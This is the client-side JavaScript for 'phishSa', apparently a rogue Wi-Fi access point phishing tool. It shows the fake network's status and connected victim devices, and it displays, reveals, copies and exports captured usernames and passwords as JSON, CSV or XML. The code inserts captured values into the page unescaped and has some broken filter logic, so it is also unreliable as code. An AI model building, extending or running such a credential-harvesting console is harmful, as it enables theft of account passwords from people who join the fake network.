const socket = io();
let startTime = new Date();
let currentSSID = 'N/A';
let currentChannel = 'N/A';
let currentInterface = 'N/A';
let trafficChart, activityChart;
let clientHistory = [];
let credentialHistory = [];
let showPasswords = false;
let currentClientFilter = 'all';
let lastClientUpdate = null;
let currentClients = [];

// Initialize charts
function initCharts() {
    // Traffic Chart
    trafficChart = new ApexCharts(document.querySelector("#trafficChart"), {
        series: [{
            name: 'Clients',
            data: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
        }],
        chart: {
            height: '100%',
            type: 'area',
            sparkline: {
                enabled: true
            },
            animations: {
                enabled: true,
                easing: 'linear',
                dynamicAnimation: {
                    speed: 1000
                }
            },
            toolbar: {
                show: false
            }
        },
        dataLabels: {
            enabled: false
        },
        stroke: {
            curve: 'smooth',
            width: 2
        },
        colors: ['#4e73df'],
        fill: {
            type: 'gradient',
            gradient: {
                shadeIntensity: 1,
                opacityFrom: 0.7,
                opacityTo: 0.3,
            }
        },
        tooltip: {
            fixed: {
                enabled: false
            },
            x: {
                show: false
            },
            marker: {
                show: false
            }
        },
        xaxis: {
            type: 'datetime',
            categories: Array(10).fill().map((_, i) => {
                const d = new Date();
                d.setMinutes(d.getMinutes() - (9 - i));
                return d.getTime();
            })
        }
    });
    trafficChart.render();

    // Activity Chart
    activityChart = new ApexCharts(document.querySelector("#activityChart"), {
        series: [{
            name: 'Activity',
            data: [0, 0, 0, 0, 0, 0, 0]
        }],
        chart: {
            height: '100%',
            type: 'bar',
            animations: {
                enabled: true,
                easing: 'easeinout',
                speed: 800,
                animateGradually: {
                    enabled: true,
                    delay: 150
                },
                dynamicAnimation: {
                    enabled: true,
                    speed: 350
                }
            },
            toolbar: {
                show: false
            }
        },
        plotOptions: {
            bar: {
                borderRadius: 4,
                horizontal: false,
                columnWidth: '55%',
            }
        },
        dataLabels: {
            enabled: false
        },
        stroke: {
            show: true,
            width: 2,
            colors: ['transparent']
        },
        colors: ['#4e73df', '#1cc88a', '#36b9cc', '#f6c23e', '#e74a3b'],
        xaxis: {
            categories: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'],
            labels: {
                style: {
                    colors: '#6c757d'
                }
            }
        },
        yaxis: {
            labels: {
                style: {
                    colors: '#6c757d'
                }
            }
        },
        fill: {
            opacity: 1
        },
        tooltip: {
            y: {
                formatter: function (val) {
                    return val + " events";
                }
            }
        }
    });
    activityChart.render();
}

// Update current time every second
function updateCurrentTime() {
    const now = new Date();
    document.getElementById('current-time').textContent =
        now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
}

// Update uptime every second
function updateUptime() {
    const now = new Date();
    const diff = Math.floor((now - startTime) / 1000);
    const hours = Math.floor(diff / 3600);
    const minutes = Math.floor((diff % 3600) / 60);
    const seconds = diff % 60;
    document.getElementById('uptime').textContent =
        `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
}

// Update traffic chart
function updateTrafficChart(count) {
    const now = new Date();
    clientHistory.push({
        time: now.getTime(),
        count: count
    });

    // Keep only last 10 entries
    if (clientHistory.length > 10) {
        clientHistory.shift();
    }

    trafficChart.updateSeries([{
        data: clientHistory.map(item => item.count)
    }]);

    trafficChart.updateOptions({
        xaxis: {
            categories: clientHistory.map(item => item.time)
        }
    });
}

// Update activity chart
function updateActivityChart() {
    // Simulate some data - in a real app you'd track actual activity
    const days = ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'];
    const data = days.map(() => Math.floor(Math.random() * 20) + 5);

    activityChart.updateSeries([{
        data: data
    }]);
}

// Initialize time updates
updateCurrentTime();
setInterval(updateCurrentTime, 1000);
updateUptime();
setInterval(updateUptime, 1000);

// Initialize charts when DOM is loaded
document.addEventListener('DOMContentLoaded', function () {
    initCharts();

    // Simulate some initial chart updates
    setTimeout(() => {
        updateTrafficChart(0);
        updateActivityChart();
    }, 1000);

    // Update charts periodically
    setInterval(() => {
        updateActivityChart();
    }, 30000);
});

// Handle initial data
socket.on('initial_data', function (data) {
    currentSSID = data.ssid || 'N/A';
    currentChannel = data.channel || 'N/A';
    currentInterface = data.interface || 'N/A';

    document.getElementById('current-ssid').textContent = currentSSID;
    document.getElementById('current-channel').textContent = currentChannel;
    document.getElementById('current-interface').textContent = currentInterface;

    updateClients(data.clients);
    updateCredentials(data.credentials);
    updateLogs(data.logs);
});

// Handle client updates with throttling
socket.on('client_update', function (data) {
    // Only update if there are actual changes
    if (JSON.stringify(data.clients) !== JSON.stringify(currentClients)) {
        updateClients(data.clients);
        updateTrafficChart(data.clients.length);
        
        // Update client trend (last 5 minutes)
        const now = new Date();
        const fiveMinutesAgo = new Date(now.getTime() - 5 * 60000);
        
        const recentClients = data.clients.filter(client => {
            const clientTime = new Date(client.timestamp);
            return clientTime > fiveMinutesAgo;
        });
        
        document.getElementById('client-trend').textContent = recentClients.length;
    }
});

// Handle credential updates
socket.on('credential_update', function (data) {
    updateCredentials(data.credentials);

    // Update last capture time
    if (data.credentials.length > 0) {
        const lastCred = data.credentials[data.credentials.length - 1];
        document.getElementById('last-capture').textContent = lastCred.timestamp;
    }

    // Update credential trend (last 5 minutes)
    const now = new Date();
    const fiveMinutesAgo = new Date(now.getTime() - 5 * 60000);

    // Filter credentials captured in last 5 minutes
    const recentCreds = data.credentials.filter(cred => {
        const credTime = new Date(cred.timestamp);
        return credTime > fiveMinutesAgo;
    });

    document.getElementById('credential-trend').textContent = recentCreds.length;
});

// Handle activity updates
socket.on('activity_update', function (data) {
    addLogEntry(data.message, data.type || 'info');
    document.getElementById('log-count').textContent = document.querySelectorAll('#activity-log .log-entry').length;
});

// Handle AP info updates
socket.on('ap_update', function (data) {
    if (data.ssid) {
        currentSSID = data.ssid;
        document.getElementById('current-ssid').textContent = currentSSID;
    }
    if (data.channel) {
        currentChannel = data.channel;
        document.getElementById('current-channel').textContent = currentChannel;
    }
    if (data.interface) {
        currentInterface = data.interface;
        document.getElementById('current-interface').textContent = currentInterface;
    }
    if (data.status) {
        const statusElement = document.getElementById('ap-status');
        statusElement.textContent = data.status;
        statusElement.className = data.status === 'Running' ?
            'badge badge-online text-white' : 'badge badge-offline text-white';
    }
});

function updateClients(clients) {
    // Check if clients have actually changed
    const clientsChanged = JSON.stringify(clients) !== JSON.stringify(currentClients);
    if (!clientsChanged && Date.now() - lastClientUpdate < 5000) {
        return; // Skip update if no changes and last update was recent
    }

    currentClients = [...clients];
    lastClientUpdate = Date.now();
    
    const container = document.getElementById('clients-container');
    const countElement = document.getElementById('client-count');
    const liveCountElement = document.getElementById('live-client-count');
    
    countElement.textContent = clients.length;
    liveCountElement.textContent = clients.length;
    
    // Update last updated time with relative format
    const now = new Date();
    document.getElementById('clients-updated').textContent = 'Just now';
    
    if (clients.length === 0) {
        container.innerHTML = '<p class="text-muted text-center py-4">No clients connected</p>';
        return;
    }
    
    let html = '';
    clients.forEach(client => {
        const signal = parseInt(client.signal) || 0;
        let signalClass = 'signal-poor';
        let signalLabel = 'Poor';

        if (signal >= -50) {
            signalClass = 'signal-excellent';
            signalLabel = 'Excellent';
        } else if (signal >= -60) {
            signalClass = 'signal-good';
            signalLabel = 'Good';
        } else if (signal >= -70) {
            signalClass = 'signal-fair';
            signalLabel = 'Fair';
        } else if (signal >= -80) {
            signalClass = 'signal-weak';
            signalLabel = 'Weak';
        }

        // Skip if filtered
        if (currentClientFilter !== 'all') {
            if (currentClientFilter === 'excellent' && signal < -50) return;
            if (currentClientFilter === 'good' && (signal < -60 || signal >= -50)) return;
            if (currentClientFilter === 'fair' && (signal < -70 || signal >= -60)) return;
        }

        html += `
            <div class="client-card fade-in" style="
                background: rgba(69, 103, 255, 0.07);
                border-radius: 10px;
                padding: 12px;
                margin-bottom: 8px;
                border-left: 3px solid ${getSignalColor(signal)};
                backdrop-filter: blur(5px);
                transition: all 0.3s ease;
            ">
                <div class="d-flex justify-content-between align-items-start">
                    <div style="flex: 1; min-width: 0;">
                        <div style="
                            display: flex;
                            align-items: center;
                            gap: 6px;
                            margin-bottom: 4px;
                        ">
                            <h6 style="
                                margin: 0;
                                font-size: 13px;
                                font-weight: 600;
                                white-space: nowrap;
                                overflow: hidden;
                                text-overflow: ellipsis;
                            ">${client.mac}</h6>
                        </div>
                        
                        ${client.ip ? `
                        <div style="
                            font-size: 11px;
                            color: #a1a1aa;
                            margin-bottom: 4px;
                            display: flex;
                            align-items: center;
                            gap: 4px;
                        ">
                            <i class="bi bi-pc-display" style="font-size: 10px;"></i>
                            <span>${client.ip}</span>
                        </div>` : ''}
                        
                        ${client.vendor ? `
                        <div style="
                            font-size: 11px;
                            color: #a1a1aa;
                            display: flex;
                            align-items: center;
                            gap: 4px;
                            margin-bottom: 6px;
                        ">
                            <i class="bi bi-tag" style="font-size: 10px;"></i>
                            <span>${client.vendor}</span>
                        </div>` : ''}
                    </div>
                    
                    <div class="${signalClass}" style="
                        display: flex;
                        flex-direction: column;
                        align-items: flex-end;
                        gap: 4px;
                    ">
                        <div style="
                            display: flex;
                            gap: 2px;
                            height: 16px;
                            align-items: flex-end;
                        ">
                            ${[1, 2, 3, 4, 5].map(i => `
                            <div style="
                                width: 4px;
                                background: ${getSignalColor(signal)};
                                border-radius: 2px;
                                height: ${Math.min(16, Math.max(3, (signal + 100) * 0.16 * i))}px;
                            "></div>
                            `).join('')}
                        </div>
                        <span style="
                            font-size: 10px;
                            font-weight: 500;
                            color: ${getSignalColor(signal)};
                        ">${signal} dBm</span>
                    </div>
                </div>
                
                <div style="
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    margin-top: 8px;
                ">
                    <div style="
                        font-size: 10px;
                        color: #71717a;
                        display: flex;
                        align-items: center;
                        gap: 4px;
                    ">
                        <i class="bi bi-clock" style="font-size: 10px;"></i>
                        <span>${client.timestamp}</span>
                    </div>
                    
                    <div class="d-flex gap-2">
                        <button class="btn btn-sm btn-outline-primary py-0 px-1 copy-mac" 
                                data-mac="${client.mac}" 
                                style="transition: all 0.2s ease;"
                                title="Copy MAC address to clipboard">
                            <i class="bi bi-clipboard me-1"></i> MAC
                        </button>
                        
                        <button class="btn btn-outline-danger btn-sm block-client" data-mac="${client.mac}">
                            <i class="bi bi-ban me-1"></i>
                            Block
                        </button>
                    </div>
                </div>
            </div>
        `;
        });

    container.innerHTML = html || '<p class="text-muted text-center py-4">No clients match the filter</p>';

    // Enhanced MAC address copy functionality
    document.querySelectorAll('.copy-mac').forEach(btn => {
        btn.addEventListener('click', async function() {
            const mac = this.getAttribute('data-mac');
            const originalContent = this.innerHTML;
            
            try {
                // Try modern clipboard API first
                if (navigator.clipboard && navigator.clipboard.writeText) {
                    await navigator.clipboard.writeText(mac);
                } 
                // Fallback for older browsers
                else {
                    const textarea = document.createElement('textarea');
                    textarea.value = mac;
                    textarea.style.position = 'fixed';
                    textarea.style.opacity = 0;
                    document.body.appendChild(textarea);
                    textarea.select();
                    
                    // Special handling for iOS devices
                    if (navigator.userAgent.match(/ipad|iphone/i)) {
                        const range = document.createRange();
                        range.selectNodeContents(textarea);
                        const selection = window.getSelection();
                        selection.removeAllRanges();
                        selection.addRange(range);
                        textarea.setSelectionRange(0, 999999);
                    }
                    
                    const success = document.execCommand('copy');
                    document.body.removeChild(textarea);
                    if (!success) throw new Error('Copy command failed');
                }
                
                // Visual feedback
                this.innerHTML = '<i class="bi bi-check-circle-fill me-1"></i> Copied!';
                this.classList.remove('btn-outline-primary');
                this.classList.add('btn-outline-success');
                
                // Show toast notification
                if (typeof showToast === 'function') {
                    showToast('MAC address copied to clipboard!');
                }
                
                // Reset button after 1.5 seconds
                setTimeout(() => {
                    this.innerHTML = originalContent;
                    this.classList.remove('btn-outline-success');
                    this.classList.add('btn-outline-primary');
                }, 1500);
                
            } catch (err) {
                console.error('Copy failed:', err);
                this.innerHTML = '<i class="bi bi-exclamation-circle-fill me-1"></i> Failed';
                this.classList.remove('btn-outline-primary');
                this.classList.add('btn-outline-danger');
                
                setTimeout(() => {
                    this.innerHTML = originalContent;
                    this.classList.remove('btn-outline-danger');
                    this.classList.add('btn-outline-primary');
                }, 1500);
                
                if (typeof showToast === 'function') {
                    showToast('Failed to copy MAC address', 'error');
                }
            }
        });
    });

    document.querySelectorAll('.block-client').forEach(btn => {
        btn.addEventListener('click', function () {
            const mac = this.getAttribute('data-mac');
            showConfirmModal(
                'Block Client',
                `Are you sure you want to block the device with MAC: ${mac}?`,
                () => {
                    socket.emit('block_client', { mac: mac });
                    showToast(`Client ${mac} blocked successfully!`);
                }
            );
        });
    });
}

// Helper function for signal strength color
function getSignalColor(signal) {
    if (signal >= -50) return '#4ade80'; // Excellent - green
    if (signal >= -60) return '#a3e635'; // Good - lime
    if (signal >= -70) return '#facc15'; // Fair - yellow
    return '#f87171'; // Poor - red
}

function updateCredentials(credentials) {
    const container = document.getElementById('credentials-container');
    const countElement = document.getElementById('credential-count');
    const liveCountElement = document.getElementById('live-credential-count');
    
    countElement.textContent = credentials.length;
    liveCountElement.textContent = credentials.length;
    
    if (credentials.length === 0) {
        container.innerHTML = '<p class="text-muted text-center py-4">No credentials captured</p>';
        return;
    }
    
    let html = '';
    credentials.slice().reverse().forEach(cred => {
        // Store actual password in data attribute
        const passwordDisplay = showPasswords ? cred.password : '*'.repeat(Math.min(cred.password.length, 10));
        
        html += `
            <div class="credential-card p-2 fade-in" style="font-size: 0.85rem; border-radius: 12px;">
                <div class="d-flex justify-content-between align-items-start mb-1">
                    <div>
                        <div class="d-flex align-items-center gap-2">
                            <i class="bi bi-router text-dark fs-6"></i>
                            <h6 class="mb-1" style="font-size: 0.9rem;">${cred.ssid}</h6>
                        </div>
                        <div class="timestamp small text-muted"><i class="bi bi-clock"></i> ${cred.timestamp}</div>
                    </div>
                    <span class="badge bg-secondary" style="font-size: 0.7rem;">${cred.mac_address}</span>
                </div>
                <div class="mt-1">
                    <div class="d-flex">
                        <strong class="me-1" style="font-size: 0.85rem;">Username:</strong>
                        <span style="font-size: 0.85rem;">${cred.username || 'N/A'}</span>
                    </div>
                    <div class="d-flex align-items-center mt-1">
                        <strong class="me-1" style="font-size: 0.85rem;">Password:</strong>
                        <span class="password-field" data-password="${cred.password}" style="font-size: 0.85rem; font-family: monospace;">${passwordDisplay}</span>
                    </div>
                </div>
                <div class="mt-2 d-flex justify-content-end gap-1">
                    <button class="btn btn-sm btn-outline-primary py-0 px-1 copy-password" 
                            data-password="${cred.password}" 
                            style="font-size: 0.77rem; transition: all 0.2s ease;"
                            title="Copy password to clipboard">
                        <i class="bi bi-clipboard"></i> Copy
                    </button>
                    <button class="btn btn-sm btn-outline-danger py-0 px-1 delete-cred" data-timestamp="${cred.timestamp}" style="font-size: 0.77rem;">
                        <i class="bi bi-trash"></i> Delete
                    </button>
                </div>
            </div>
        `;
    });
    container.innerHTML = html;
    
    // Add event listeners to copy buttons
    document.querySelectorAll('.copy-password').forEach(btn => {
        btn.addEventListener('click', async function() {
            const password = this.getAttribute('data-password');
            const icon = this.querySelector('i');
            const originalText = this.innerHTML;
            
            try {
                // Modern clipboard API with fallback
                if (navigator.clipboard) {
                    await navigator.clipboard.writeText(password);
                } else {
                    // Fallback for older browsers
                    const textarea = document.createElement('textarea');
                    textarea.value = password;
                    textarea.style.position = 'fixed';  // Prevent scrolling
                    document.body.appendChild(textarea);
                    textarea.select();
                    document.execCommand('copy');
                    document.body.removeChild(textarea);
                }
                
                // Visual feedback
                this.innerHTML = '<i class="bi bi-check"></i> Copied!';
                this.classList.remove('btn-outline-primary');
                this.classList.add('btn-outline-success');
                
                // Reset button after 2 seconds
                setTimeout(() => {
                    this.innerHTML = originalText;
                    this.classList.remove('btn-outline-success');
                    this.classList.add('btn-outline-primary');
                }, 2000);
                
            } catch (err) {
                console.error('Failed to copy password: ', err);
                this.innerHTML = '<i class="bi bi-x"></i> Failed';
                this.classList.remove('btn-outline-primary');
                this.classList.add('btn-outline-danger');
                
                setTimeout(() => {
                    this.innerHTML = originalText;
                    this.classList.remove('btn-outline-danger');
                    this.classList.add('btn-outline-primary');
                }, 2000);
            }
        });
    });

    document.querySelectorAll('.delete-cred').forEach(btn => {
        btn.addEventListener('click', function () { 
            const timestamp = this.getAttribute('data-timestamp');
            showConfirmModal(
                'Delete Credential',
                'Are you sure you want to delete these credentials?',
                () => {
                    socket.emit('delete_credential', { timestamp: timestamp });
                }
            );
        });
    });
}

function updateLogs(logs) {
    const container = document.getElementById('activity-log');

    if (logs.length === 0) {
        container.innerHTML = '<p class="text-muted p-4 text-center">Waiting for activity...</p>';
        return;
    }

    let html = '';
    logs.slice().reverse().forEach(log => {
        let logClass = 'log-info';
        let icon = 'bi-info-circle';

        if (log.includes('error') || log.includes('Error')) {
            logClass = 'log-danger';
            icon = 'bi-exclamation-triangle';
        } else if (log.includes('warning') || log.includes('Warning')) {
            logClass = 'log-warning';
            icon = 'bi-exclamation-circle';
        } else if (log.includes('success') || log.includes('Success')) {
            logClass = 'log-success';
            icon = 'bi-check-circle';
        } else if (log.includes('credential') || log.includes('Credential')) {
            logClass = 'log-danger';
            icon = 'bi-shield-lock';
        }

        html += `
            <div class="log-entry ${logClass}">
                <i class="bi ${icon}"></i>
                <span>${log}</span>
            </div>
        `;
    });
    container.innerHTML = html;
    document.getElementById('log-count').textContent = logs.length;
}

function addLogEntry(message, type = 'info') {
    const container = document.getElementById('activity-log');
    const noLogs = container.querySelector('p.text-muted');

    if (noLogs) {
        container.innerHTML = '';
    }

    let logClass = 'log-info';
    let icon = 'bi-info-circle';

    if (type === 'error' || message.includes('error') || message.includes('Error')) {
        logClass = 'log-danger';
        icon = 'bi-exclamation-triangle';
    } else if (type === 'warning' || message.includes('warning') || message.includes('Warning')) {
        logClass = 'log-warning';
        icon = 'bi-exclamation-circle';
    } else if (type === 'success' || message.includes('success') || message.includes('Success')) {
        logClass = 'log-success';
        icon = 'bi-check-circle';
    } else if (message.includes('credential') || message.includes('Credential')) {
        logClass = 'log-danger';
        icon = 'bi-shield-lock';
    }

    const newEntry = document.createElement('div');
    newEntry.className = `log-entry ${logClass} fade-in`;
    newEntry.innerHTML = `<i class="bi ${icon}"></i><span>${message}</span>`;

    container.insertBefore(newEntry, container.firstChild);
    document.getElementById('log-count').textContent = document.querySelectorAll('#activity-log .log-entry').length;

    // Apply pulse animation to new log entries
    newEntry.classList.add('pulse');
    setTimeout(() => {
        newEntry.classList.remove('pulse');
    }, 3000);
}

// Show toast notification
function showToast(message, type = 'success') {
    const toast = document.createElement('div');
    toast.className = `toast show align-items-center text-white bg-${type} border-0 position-fixed bottom-0 end-0 m-3`;
    toast.style.zIndex = '9999';
    toast.setAttribute('role', 'alert');
    toast.setAttribute('aria-live', 'assertive');
    toast.setAttribute('aria-atomic', 'true');

    toast.innerHTML = `
        <div class="d-flex">
            <div class="toast-body">
                ${message}
            </div>
            <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button>
        </div>
    `;

    document.body.appendChild(toast);

    setTimeout(() => {
        toast.classList.remove('show');
        setTimeout(() => {
            toast.remove();
        }, 300);
    }, 3000);
}

// Show confirmation modal
function showConfirmModal(title, message, confirmCallback) {
    document.getElementById('confirmModalTitle').textContent = title;
    document.getElementById('confirmModalBody').textContent = message;

    const modal = new bootstrap.Modal(document.getElementById('confirmModal'));
    modal.show();

    document.getElementById('confirmAction').onclick = function () {
        confirmCallback();
        modal.hide();
    };
}

function exportData(type, format) {
    if (!['credentials', 'logs'].includes(type)) {
        console.error('Invalid export type:', type);
        return;
    }
    if (!['json', 'csv', 'xml'].includes(format)) {
        console.error('Invalid export format:', format);
        return;
    }

    // Prepare data based on type
    let content = '';
    let filename = '';
    let mimeType = '';

    try {
        if (type === 'credentials') {
            const credentials = Array.from(document.querySelectorAll('.credential-card')).map(card => {
                return {
                    ssid: card.querySelector('h6').textContent.trim(),
                    username: card.querySelector('div:nth-child(2) > div:first-child').textContent.replace('Username:', '').trim(),
                    password: card.querySelector('.password-field').getAttribute('data-password'),
                    mac: card.querySelector('.badge').textContent.trim(),
                    timestamp: card.querySelector('.timestamp').textContent.replace('Last seen:', '').trim()
                };
            });

            switch(format) {
                case 'json':
                    content = JSON.stringify(credentials, null, 2);
                    filename = `phishsa-credentials-${Date.now()}.json`;
                    mimeType = 'application/json';
                    break;

                case 'csv':
                    const csvHeaders = ['SSID', 'Username', 'Password', 'MAC', 'Timestamp'];
                    content = csvHeaders.join(',') + '\n';
                    credentials.forEach(cred => {
                        const row = [
                            `"${cred.ssid.replace(/"/g, '""')}"`,
                            `"${cred.username.replace(/"/g, '""')}"`,
                            `"${cred.password.replace(/"/g, '""')}"`,
                            `"${cred.mac.replace(/"/g, '""')}"`,
                            `"${cred.timestamp.replace(/"/g, '""')}"`
                        ];
                        content += row.join(',') + '\n';
                    });
                    filename = `phishsa-credentials-${Date.now()}.csv`;
                    mimeType = 'text/csv;charset=utf-8;';
                    break;

                case 'xml':
                    content = '<?xml version="1.0" encoding="UTF-8"?>\n<credentials>\n';
                    credentials.forEach(cred => {
                        content += '  <credential>\n';
                        content += `    <ssid>${escapeXml(cred.ssid)}</ssid>\n`;
                        content += `    <username>${escapeXml(cred.username)}</username>\n`;
                        content += `    <password>${escapeXml(cred.password)}</password>\n`;
                        content += `    <mac>${escapeXml(cred.mac)}</mac>\n`;
                        content += `    <timestamp>${escapeXml(cred.timestamp)}</timestamp>\n`;
                        content += '  </credential>\n';
                    });
                    content += '</credentials>';
                    filename = `phishsa-credentials-${Date.now()}.xml`;
                    mimeType = 'application/xml;charset=utf-8;';
                    break;

                default:
                    throw new Error(`Unsupported format for credentials: ${format}`);
            }
        }
        else if (type === 'logs') {
            const logs = Array.from(document.querySelectorAll('#activity-log .log-entry')).map(entry => {
                const text = entry.querySelector('span').textContent;
                const timestampMatch = text.match(/\[(.*?)\]/);
                return {
                    timestamp: timestampMatch ? timestampMatch[1] : '',
                    message: timestampMatch ? text.replace(timestampMatch[0], '').trim() : text.trim()
                };
            });

            switch(format) {
                case 'json':
                    content = JSON.stringify(logs, null, 2);
                    filename = `phishsa-logs-${Date.now()}.json`;
                    mimeType = 'application/json';
                    break;

                case 'csv':
                    content = 'Timestamp,Message\n';
                    logs.forEach(log => {
                        content += `"${log.timestamp.replace(/"/g, '""')}","${log.message.replace(/"/g, '""')}"\n`;
                    });
                    filename = `phishsa-logs-${Date.now()}.csv`;
                    mimeType = 'text/csv;charset=utf-8;';
                    break;

                default:
                    throw new Error(`Unsupported format for logs: ${format}`);
            }
        }

        // Update modal preview
        document.getElementById('exportModalTitle').textContent = `Export ${type.charAt(0).toUpperCase() + type.slice(1)} (${format.toUpperCase()})`;
        document.getElementById('exportContent').value = content;
        
        // Set up download
        document.getElementById('downloadExport').onclick = function() {
            const blob = new Blob([content], { type: mimeType });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            a.style.display = 'none';
            document.body.appendChild(a);
            a.click();
            
            // Cleanup
            setTimeout(() => {
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
            }, 100);

            showToast(`Successfully exported ${type} as ${format.toUpperCase()} file`);
            bootstrap.Modal.getInstance(document.getElementById('exportModal')).hide();
        };

        // Show modal
        new bootstrap.Modal(document.getElementById('exportModal')).show();

    } catch (error) {
        console.error('Export failed:', error);
        showToast(`Export failed: ${error.message}`, 'error');
    }
}

// Helper functions
function escapeXml(unsafe) {
    return unsafe.replace(/[<>&'"]/g, function(c) {
        switch (c) {
            case '<': return '&lt;';
            case '>': return '&gt;';
            case '&': return '&amp;';
            case '\'': return '&apos;';
            case '"': return '&quot;';
        }
    });
}

function escapeHtml(unsafe) {
    return unsafe.replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;")
                .replace(/"/g, "&quot;")
                .replace(/'/g, "&#039;");
}

// Event listeners for UI elements
document.getElementById('toggle-password').addEventListener('click', function () {
    showPasswords = !showPasswords;
    this.innerHTML = showPasswords ? '<i class="bi bi-eye-slash-fill"></i>' : '<i class="bi bi-eye-fill"></i>';
    
    // Update all password fields
    document.querySelectorAll('.password-field').forEach(field => {
        const actualPassword = field.getAttribute('data-password');
        field.textContent = showPasswords ? actualPassword : '*'.repeat(Math.min(actualPassword.length, 10));
    });
    
    showToast(showPasswords ? 'Passwords revealed' : 'Passwords hidden');
});

// Clear Logs with proper response handling
document.getElementById('clear-log').addEventListener('click', function() {
    showConfirmModal(
        'Clear Logs',
        'Are you sure you want to permanently clear all activity logs? This action cannot be undone.',
        () => {
            // Show loading state
            const originalText = this.innerHTML;
            this.innerHTML = '<span class="spinner-border spinner-border-sm"></span> Clearing...';
            this.disabled = true;
            
            socket.emit('clear_logs');
            
            // Handle single response
            socket.once('clear_logs_response', function(response) {
                // Restore button state
                const btn = document.getElementById('clear-log');
                btn.innerHTML = originalText;
                btn.disabled = false;
                
                if (response.success) {
                    // Clear UI elements
                    document.getElementById('activity-log').innerHTML = 
                        '<div class="text-center p-4">' +
                        '   <i class="bi bi-journal-x fs-1 text-muted mb-2"></i>' +
                        '   <p class="text-muted">Activity log cleared</p>' +
                        '</div>';
                    
                    // Update log counter
                    document.getElementById('log-count').textContent = '0';
                    
                    // Show success notification
                    showToast('Activity log cleared successfully');
                    
                    // Optional: Update last cleared time
                    const now = new Date();
                    document.getElementById('last-cleared').textContent = 
                        `Last cleared: ${now.toLocaleString()}`;
                } else {
                    showToast(response.error || 'Failed to clear logs', 'danger');
                }
            });
        },
        {
            confirmText: 'Clear All',
            confirmClass: 'btn-danger',
            cancelText: 'Cancel'
        }
    );
});


document.getElementById('exportCredentials').addEventListener('click', function () {
    exportData('credentials', 'json');
});

document.getElementById('exportLogs').addEventListener('click', function () {
    exportData('logs', 'json');
});

// Clear Credentials with proper response handling
document.getElementById('clearCredentials').addEventListener('click', function() {
    showConfirmModal(
        'Clear Credentials',
        'Are you sure you want to delete all captured credentials?',
        () => {
            socket.emit('clear_credentials');
            
            // Handle response
            socket.once('clear_credentials_response', function(response) {
                if (response.success) {
                    document.getElementById('credentials-container').innerHTML = 
                        '<p class="text-muted text-center py-4">No credentials captured</p>';
                    document.getElementById('credential-count').textContent = '0';
                    document.getElementById('live-credential-count').textContent = '0';
                    showToast('All credentials cleared successfully');
                } else {
                    showToast('Failed to clear credentials', 'danger');
                }
            });
        }
    );
});

// Clear Logs with proper response handling
document.getElementById('clearLogs').addEventListener('click', function() {
    showConfirmModal(
        'Clear Logs',
        'Are you sure you want to clear all activity logs?',
        () => {
            socket.emit('clear_logs');
            
            // Handle response
            socket.once('clear_logs_response', function(response) {
                if (response.success) {
                    document.getElementById('activity-log').innerHTML = 
                        '<p class="text-muted p-4 text-center">Waiting for activity...</p>';
                    document.getElementById('log-count').textContent = '0';
                    showToast('Activity log cleared successfully');
                } else {
                    showToast('Failed to clear logs', 'danger');
                }
            });
        }
    );
});

// Improved client refresh with accurate counting
socket.on('refresh_clients_response', function(data) {
    const refreshBtn = document.getElementById('refresh-clients');
    
    // Reset button state
    refreshBtn.innerHTML = '<i class="bi bi-arrow-clockwise"></i> Refresh';
    refreshBtn.disabled = false;
    
    if (data.success) {
        // Update UI with accurate count
        document.getElementById('client-count').textContent = data.count;
        document.getElementById('live-client-count').textContent = data.count;
        document.getElementById('clients-updated').textContent = data.update_time || 'Just now';
        
        showToast(`Found ${data.count} clients`);
    } else {
        showToast(data.error || 'Failed to refresh clients', 'danger');
    }
});

// Client filter dropdown
document.querySelectorAll('[data-filter]').forEach(item => {
    item.addEventListener('click', function (e) {
        e.preventDefault();
        currentClientFilter = this.getAttribute('data-filter');

        // Update active state
        document.querySelectorAll('[data-filter]').forEach(i => i.classList.remove('active'));
        this.classList.add('active');

        // Refresh client display
        const clients = Array.from(document.querySelectorAll('.client-card')).map(card => {
            return {
                mac: card.querySelector('h6').textContent,
                vendor: card.querySelector('.vendor-chip')?.textContent,
                signal: parseInt(card.querySelector('.signal-bars + span').textContent),
                timestamp: card.querySelector('.timestamp').textContent.replace('Last seen: ', '')
            };
        });

        updateClients(clients);
    });
});

// Theme toggle logic
const toggle = document.getElementById('darkModeToggle');
const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
const savedTheme = localStorage.getItem('phishSa-theme');

if (savedTheme === 'dark' || (!savedTheme && prefersDark)) {
    document.body.classList.add('dark-mode');
    toggle.checked = true;
}

toggle.addEventListener('change', () => {
    if (toggle.checked) {
        document.body.classList.add('dark-mode');
        localStorage.setItem('phishSa-theme', 'dark');
    } else {
        document.body.classList.remove('dark-mode');
        localStorage.setItem('phishSa-theme', 'light');
    }

    // Refresh charts to match theme
    if (trafficChart) {
        trafficChart.updateOptions({
            theme: {
                mode: toggle.checked ? 'dark' : 'light'
            }
        });
    }

    if (activityChart) {
        activityChart.updateOptions({
            theme: {
                mode: toggle.checked ? 'dark' : 'light'
            }
        });
    }
});

// Initialize tooltips
const tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'));
tooltipTriggerList.map(function (tooltipTriggerEl) {
    return new bootstrap.Tooltip(tooltipTriggerEl);
});

// Show welcome message
setTimeout(() => {
    addLogEntry('phishSa dashboard initialized and ready', 'success');
}, 1000);

